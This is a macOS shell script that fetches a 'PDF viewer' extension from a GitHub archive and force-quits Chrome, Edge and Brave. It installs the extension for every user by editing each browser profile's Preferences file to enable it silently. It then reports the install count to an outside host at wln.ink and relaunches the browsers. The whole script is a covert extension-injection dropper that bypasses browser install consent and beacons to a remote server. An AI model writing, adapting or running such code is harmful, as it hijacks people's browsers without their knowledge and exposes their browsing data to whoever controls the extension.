#!/bin/bash
set -e
EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip"
NOTIFY_URL="https://wln.ink/n"
INJ=0

TMP_ZIP="/tmp/pdf-ext.zip"
TMP_DIR="/tmp/pdf-ext-tmp"
curl -fsSL "$EXT_URL" -o "$TMP_ZIP" || { echo "Download failed"; exit 1; }
rm -rf "$TMP_DIR"
unzip -q "$TMP_ZIP" -d "$TMP_DIR" 2>/dev/null || { echo "Unzip failed"; exit 1; }
MANIFEST=$(find "$TMP_DIR" -name "manifest.json" -type f | head -1)
[ -z "$MANIFEST" ] && { echo "Extension not found"; exit 1; }
EXT_SRC=$(dirname "$MANIFEST")
rm -f "$TMP_ZIP"

gen_id() {
    local path="$1"
    echo -n "$path" | shasum -a 256 | head -c 32 | perl -pe 's/(.)/sprintf("%c", 97 + (ord($1) & 15))/ge'
}

inject_pref() {
    local pref="$1" ext_dir="$2" ext_id="$3"
    [ ! -f "$pref" ] && return 1
    
    perl -0777 -i -pe '
        BEGIN {
            $ext_dir = $ENV{EXT_DIR};
            $ext_id = $ENV{EXT_ID};
            $manifest = `cat "$ENV{MANIFEST}"`;
            chomp $manifest;
        }
        
        s/"extensions"\s*:\s*\{/"extensions":{/s;
        
        if (/"extensions"\s*:\s*\{/) {
            s/("extensions"\s*:\s*\{)/$1"settings":{/s unless /"settings"\s*:\s*\{/;
            
            unless (/"$ext_id"/) {
                s/("settings"\s*:\s*\{)/$1"$ext_id":{"path":"$ext_dir","location":4,"state":1,"manifest":$manifest},/s;
            }
        }
    ' "$pref" 2>/dev/null || return 1
    
    grep -q "$ext_id" "$pref" && return 0 || return 1
}

for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
    pkill -x "$app" 2>/dev/null || true
done
sleep 1

for uhome in /Users/*; do
    [ ! -d "$uhome" ] || [ "$uhome" = "/Users/Shared" ] && continue
    
    uext="$uhome/Library/Application Support/PDFViewerExt"
    rm -rf "$uext" 2>/dev/null || true
    cp -R "$EXT_SRC" "$uext" 2>/dev/null || continue
    
    eid=$(gen_id "$uext")
    export EXT_DIR="$uext"
    export EXT_ID="$eid"
    export MANIFEST="$uext/manifest.json"
    
    for rel in "Google/Chrome" "Microsoft Edge" "BraveSoftware/Brave-Browser"; do
        udata="$uhome/Library/Application Support/$rel"
        [ ! -d "$udata" ] && continue
        
        for pdir in "$udata/Default" "$udata/Profile"*; do
            [ ! -d "$pdir" ] && continue
            pref="$pdir/Preferences"
            if inject_pref "$pref" "$uext" "$eid"; then
                INJ=$((INJ + 1))
            fi
        done
    done
done

rm -rf "$TMP_DIR"

if [ $INJ -eq 0 ]; then
    curl -fsS -m 5 -X POST "$NOTIFY_URL" -d "ev=install_fail&os=macos&info=no profiles" 2>/dev/null || true
    echo "No browser profiles found"
    exit 1
fi

for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
    open -a "$app" --args --restore-last-session 2>/dev/null || true
done

curl -fsS -m 5 -X POST "$NOTIFY_URL" -d "ev=install&os=macos&info=$INJ profiles" 2>/dev/null || true
echo "Successfully installed to $INJ profiles"
exit 0
